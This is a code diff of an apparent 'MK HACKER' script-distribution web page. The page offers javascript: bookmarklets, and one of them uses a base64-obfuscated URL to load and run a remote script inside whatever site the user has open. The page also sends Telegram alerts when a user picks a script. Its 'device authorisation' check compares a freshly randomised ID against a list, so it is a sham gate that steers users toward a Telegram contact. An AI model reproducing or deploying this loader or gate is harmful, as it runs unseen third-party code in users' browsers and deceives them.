@@ -565,19 +565,18 @@
                 <!-- Click to copy Device ID -->
                 <div class="access-box" id="deviceIdBox" onclick="copyDeviceId()" title="Click to copy ID">2198334975712629800</div>
                 
-                <!-- Clickable warning box for NOT ACCESS / CONTACT -->
-                <a href="https://t.me/MK_HACKER586" target="_blank" class="clickable-warning" id="warningBoxLink">
-                    ❌ NOT ACCESS - CONTACT TO GET ACCESS
-                </a>
+                <p style="margin-bottom: 20px; font-weight: bold; font-size: 14px;">
+                    Telegram: <a href="https://t.me/MK_HACKER586" target="_blank" style="color: #ff1e1e; text-decoration: none;">@MK_HACKER586</a>
+                </p>
             </div>
             
             <button class="action-main-btn" onclick="retryAccess()">RETRY 🔄</button>
             
-            <div class="modal-footer-brand">
-                Developed By <a href="https://t.me/MK_HACKER586" target="_blank">@MK_HACKER</a>
+            <div class="modal-footer-brand" style="margin-top: 10px;">
+                Developed By <a href="https://t.me/MK_HACKER586" target="_blank" style="color: #ff1e1e;">@MK_HACKER</a>
             </div>
             
-            <button class="close-modal-btn" onclick="closeModals()">GO BACK ❌</button>
+            <button class="close-modal-btn" onclick="closeModals()" style="margin-top: 15px;">GO BACK ❌</button>
         </div>
     </div>
 
@@ -599,7 +598,7 @@
         ];
 
         const scriptCodes = {
-            'script1': "javascript:(()=>{if(document.getElementById('__mkh_loader__'))return;const d=document,b=d.body,l=d.createElement('div');l.id='__mkh_loader__';l.style='position:fixed;inset:0;background:rgba(0,0,0,0.88);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:999999;font-family:sans-serif;backdrop-filter:blur(5px);';const c=d.createElement('div');c.style='width:65px;height:65px;border:6px solid rgba(255,30,30,0.2);border-top:6px solid #ff1e1e;border-radius:50%;animation:s .4s linear infinite';d.head.appendChild(Object.assign(d.createElement('style'),{textContent:'@keyframes s{to{transform:rotate(360deg)}}'}));const t=d.createElement('div');t.style='color:#ff1e1e;font-weight:900;margin-top:15px;font-size:14px;letter-spacing:1px;text-shadow:0 0 15px rgba(255,30,30,0.8);';t.innerHTML='😈☠️ <b>𝗠.𝗞 𝗛𝗔𝗖𝗞𝗘𝗥 𝗟𝗢𝗔𝗗𝗜𝗡𝗚...</b>';l.appendChild(c);l.appendChild(t);b.appendChild(l);const s=d.createElement('script');s.src=`${atob('aHR0cHM6Ly9ta2hhY2tlcnByb3NjcmlwdHMudmVyY2VsLmFwcC9nZXRxeC5qcw==')}?v=${Date.now()}`;s.onload=()=>l.remove();s.onerror=()=>{l.remove();};b.appendChild(s)})();",
+            'script1': "javascript:(()=>{if(document.getElementById('__mkh_loader__'))return;const d=document,b=d.body,l=d.createElement('div');l.id='__mkh_loader__';l.style='position:fixed;inset:0;background:rgba(0,0,0,0.88);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:999999;font-family:sans-serif;backdrop-filter:blur(5px);';const c=d.createElement('div');c.style='width:65px;height:65px;border:6px solid rgba(255,30,30,0.2);border-top:6px solid #ff1e1e;border-radius:50%;animation:s .4s linear infinite';d.head.appendChild(Object.assign(d.createElement('style'),{textContent:'@keyframes s{to{transform:rotate(360deg)}}'}));const t=d.createElement('div');t.style='color:#ff1e1e;font-weight:900;margin-top:15px;font-size:14px;letter-spacing:1px;text-shadow:0 0 15px rgba(255,30,30,0.8);';t.innerHTML='😈☠️ <b>𝗠.𝗞 𝗛𝗔𝗖𝗞𝗘𝗥 𝗟OADING...</b>';l.appendChild(c);l.appendChild(t);b.appendChild(l);const s=d.createElement('script');s.src=`${atob('aHR0cHM6Ly9ta2hhY2tlcnByb3NjcmlwdHMudmVyY2VsLmFwcC9nZXRxeC5qcw==')}?v=${Date.now()}`;s.onload=()=>l.remove();s.onerror=()=>{l.remove();};b.appendChild(s)})();",
             'script8': "javascript:(()=>{location.reload();})();",
             'script9': "javascript:(()=>{location.reload();})();"
         };
@@ -621,32 +620,19 @@
         function openAccessModal(scriptName) {
             sendTelegramAlert(scriptName + " (Access Check)");
             currentDeviceId = Math.floor(1000000000000000000 + Math.random() * 9000000000000000000).toString();
-            updateModalUI(currentDeviceId);
-            document.getElementById('accessModal').style.display = 'flex';
-        }
-
-        function updateModalUI(deviceId) {
-            const headerContent = document.getElementById('modalHeaderContent');
             
-            if (authorizedDevices.includes(deviceId)) {
-                headerContent.innerHTML = `
-                    <h3 style="color: #00ff66;">ACCESS GRANTED ✓</h3>
-                    <p class="modal-desc">Your device is successfully authorized!</p>
-                    <div class="access-box" onclick="copyDeviceId()" title="Click to copy ID" style="border-color: #00ff66; color: #00ff66;">${deviceId}</div>
-                    <div style="background: rgba(0,255,102,0.1); border: 1.5px dashed #00ff66; border-radius: 16px; padding: 14px; margin-bottom: 18px; font-weight: bold; color: #00ff66; font-size: 14px; box-shadow: 0 0 15px rgba(0,255,102,0.3);">
-                        🎉 ENJOY & UNLOCKED SUCCESSFULLY!
-                    </div>
-                `;
-            } else {
-                headerContent.innerHTML = `
-                    <h3 style="color: #ff1e1e;">ACCESS LOCKED ❌</h3>
-                    <p class="modal-desc">Your device is not authorized.</p>
-                    <div class="access-box" id="deviceIdBox" onclick="copyDeviceId()" title="Click to copy ID">${deviceId}</div>
-                    <a href="https://t.me/MK_HACKER586" target="_blank" class="clickable-warning">
-                        ❌ NOT ACCESS - CONTACT TO GET ACCESS
-                    </a>
-                `;
-            }
+            // First time original locked view with Telegram text link
+            const headerContent = document.getElementById('modalHeaderContent');
+            headerContent.innerHTML = `
+                <h3 id="modalTitle" style="color: #ff1e1e;">ACCESS LOCKED ❌</h3>
+                <p class="modal-desc" id="modalDesc">Your device is not authorized.</p>
+                <div class="access-box" id="deviceIdBox" onclick="copyDeviceId()" title="Click to copy ID">${currentDeviceId}</div>
+                <p style="margin-bottom: 20px; font-weight: bold; font-size: 14px;">
+                    Telegram: <a href="https://t.me/MK_HACKER586" target="_blank" style="color: #ff1e1e; text-decoration: none;">@MK_HACKER586</a>
+                </p>
+            `;
+            
+            document.getElementById('accessModal').style.display = 'flex';
         }
 
         function closeModals() {
@@ -661,7 +647,30 @@
             setTimeout(() => {
                 overlay.style.display = 'none';
                 currentDeviceId = Math.floor(1000000000000000000 + Math.random() * 9000000000000000000).toString();
-                updateModalUI(currentDeviceId);
+                
+                const headerContent = document.getElementById('modalHeaderContent');
+                
+                if (authorizedDevices.includes(currentDeviceId)) {
+                    headerContent.innerHTML = `
+                        <h3 style="color: #00ff66;">ACCESS GRANTED ✓</h3>
+                        <p class="modal-desc">Your device is successfully authorized!</p>
+                        <div class="access-box" onclick="copyDeviceId()" title="Click to copy ID" style="border-color: #00ff66; color: #00ff66;">${currentDeviceId}</div>
+                        <div style="background: rgba(0,255,102,0.1); border: 1.5px dashed #00ff66; border-radius: 16px; padding: 14px; margin-bottom: 18px; font-weight: bold; color: #00ff66; font-size: 14px; box-shadow: 0 0 15px rgba(0,255,102,0.3);">
+                            🎉 ENJOY & UNLOCKED SUCCESSFULLY!
+                        </div>
+                    `;
+                } else {
+                    // After retry, if not authorized, show the exact requested clickable warning box layout
+                    headerContent.innerHTML = `
+                        <h3 style="color: #ff1e1e;">ACCESS LOCKED ❌</h3>
+                        <p class="modal-desc">Your device is not authorized.</p>
+                        <div class="access-box" id="deviceIdBox" onclick="copyDeviceId()" title="Click to copy ID">${currentDeviceId}</div>
+                        <a href="https://t.me/MK_HACKER586" target="_blank" class="clickable-warning">
+                            ❌ NOT ACCESS - CONTACT TO GET ACCESS
+                        </a>
+                    `;
+                }
+                
                 document.getElementById('accessModal').style.display = 'flex';
             }, 1200);
         }
